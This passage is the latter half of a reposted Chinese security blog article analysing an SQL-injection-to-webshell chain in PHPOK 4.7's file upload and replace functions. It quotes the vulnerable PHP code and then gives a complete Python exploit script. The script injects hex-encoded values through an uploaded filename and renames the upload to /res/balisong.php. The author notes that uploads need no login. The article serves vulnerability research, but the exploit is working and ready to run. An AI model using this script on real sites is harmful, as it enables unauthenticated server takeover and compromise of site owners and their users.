class="line">            $my_ext[&quot;height&quot;] = $img_ext[1];</span><br><span class="line">        &#125;</span><br><span class="line">        //替换资源</span><br><span class="line">        $this-&gt;lib(&apos;file&apos;)-&gt;mv($rs[&quot;filename&quot;],$old_rs[&quot;filename&quot;]);</span><br><span class="line">        $tmp = array(&quot;addtime&quot;=&gt;$this-&gt;time);</span><br><span class="line">        $tmp[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;save($tmp,$id);</span><br><span class="line">        //更新附件扩展信息</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $this-&gt;json($rs,true);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里我们输入一个oldid的值，然后从res表中查找出这一行的数据，然后将我们上传的文件mv到$old_rs[‘filename’]。<br>mv函数的定义在/framework/libs/file.php中第264行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function mv($old,$new,$recover=true)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!file_exists($old))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($new,-1) == &quot;/&quot;)&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;dir&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;file&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(file_exists($new))&#123;</span><br><span class="line">            if($recover)&#123;</span><br><span class="line">                unlink($new);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $new = $new.basename($old);</span><br><span class="line">        &#125;</span><br><span class="line">        rename($old,$new);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过上文说到的，我们可以控制res表中的一行记录的值，那么这个filename也是我们可控的，那么我们如果将filename设置为/res/balisong.php。那么我上传的图片文件就会重新命名成/res/balisong.php。我们就达到了一个getshell的目的。</p>
<p>由于上传的文件名的特殊性。导致我们不能带有斜杠，那么怎么办呢？我们可以利用十六进制编码来绕过，具体的漏洞利用过程就不细说了，比较复杂，所以直接上exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">\#-*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print u&quot;Usage: exp.py url [PHPSESSION]\r\nFor example:\r\n[0] exp.py http://localhost\r\n[1] exp.py http://localhost 6ogmgp727m0ivf6rnteeouuj02&quot;</span><br><span class="line">    exit()</span><br><span class="line">baseurl = sys.argv[1]</span><br><span class="line">phpses = sys.argv[2] if len(sys.argv) &gt; 2 else &apos;&apos;</span><br><span class="line">cookies = &#123;&apos;PHPSESSION&apos;: phpses&#125;</span><br><span class="line">if baseurl[-1] == &apos;/&apos;:</span><br><span class="line">    baseurl = baseurl[:-1]</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=save&apos;</span><br><span class="line">files = [</span><br><span class="line">    (&apos;upfile&apos;, (&quot;1&apos;,&apos;r7ip15ijku7jeu1s1qqnvo9gj0&apos;,&apos;30&apos;,&apos;&apos;),(&apos;1&apos;,0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,&apos;&apos;,0x7265732f62616c69736f6e672e706870,&apos;1495536080&apos;,&apos;2.jpg&quot;,</span><br><span class="line">                &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">files1 = [</span><br><span class="line">    (&apos;upfile&apos;,</span><br><span class="line">     (&apos;1.jpg&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">r = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">response = r.text</span><br><span class="line">id = re.search(&apos;&quot;id&quot;:&quot;(\d+)&quot;&apos;, response, re.S).group(1)</span><br><span class="line">id = int(id) + 1</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=replace&amp;oldid=%d&apos; % (id)</span><br><span class="line">r = requests.post(url, files=files1, cookies=cookies)</span><br><span class="line">shell = baseurl + &apos;/res/balisong.php&apos;</span><br><span class="line">response = requests.get(shell)</span><br><span class="line">if response.status_code == 200:</span><br><span class="line">    print &quot;congratulation:Your shell:\n%s\npassword:balisong&quot; % (shell)</span><br><span class="line">else:</span><br><span class="line">    print &quot;oh!Maybe failed.Please check&quot;</span><br></pre></td></tr></table></figure>
<p>系统默认是不需要注册登录即可上传文件的。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实这种情况还是蛮多的，有些系统会将上传前的文件名入库，如果过滤不当，就可以注入了。并且insert，update这种注入危害是可以进一步扩大的。</p>
<p>转载于<a href="https://xz.aliyun.com/t/1569/#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/1569/#toc-1</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/projects_url">项目</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&text=PHPOK 4.7从注入到getshell"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&is_video=false&description=PHPOK 4.7从注入到getshell"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PHPOK 4.7从注入到getshell&body=Check out this article: http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&name=PHPOK 4.7从注入到getshell&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&t=PHPOK 4.7从注入到getshell"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2021
    JYP
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/projects_url">项目</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
